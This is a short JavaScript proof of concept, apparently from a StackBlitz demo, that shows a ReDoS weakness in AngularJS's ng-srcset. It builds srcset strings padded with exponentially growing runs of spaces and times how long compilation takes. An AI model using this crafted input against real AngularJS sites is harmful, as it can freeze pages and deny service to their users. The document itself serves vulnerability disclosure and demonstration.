// https://stackblitz.com/edit/angularjs-vulnerability-ng-srcset-redos?file=index.js
// Define controllers.
class AppCtrl {
  static $inject = ['$compile', '$rootScope'];

  ngSrcSet = null;
  ngSrcSetCompiledElem = null;
  timeoutId = null;
  duration = '(N/A)';

  constructor($compile, $rootScope) {
    this.$compile = $compile;
    this.$rootScope = $rootScope;
    this.setNgSrcSetWithSpacesPowerOf2Exponent(0);
  }

  setNgSrcSetWithSpacesPowerOf2Exponent(exponent) {
    this.ngSrcSet = `http://example.com/image.png 2x, ${' '.repeat(
      2 ** exponent
    )}http://example.com/image.png`;
  }

  compileNgSrcSet() {
    clearTimeout(this.timeoutId);

    // Use `setTimeout` to allow manual `$apply` calls.
    this.timeoutId = setTimeout(() => {
      try {
        this.ngSrcSetCompiledElem.html(`<img ng-srcset="${this.ngSrcSet}">`);
        const scope = this.ngSrcSetCompiledElem.scope();

        const start = performance.now();
        this.$compile(this.ngSrcSetCompiledElem)(scope);
        this.$rootScope.$apply();
        const end = performance.now();

        this.duration = `${((end - start) / 1000).toFixed(2)} seconds`;
      } catch (err) {
        console.error(err);

        this.duration = '(APP CRASHED)';
      } finally {
        this.$rootScope.$apply(); // apply the duration change
      }
    });
  }
}

// Define and configure the app.
angular.module('app', []).controller('AppCtrl', AppCtrl);
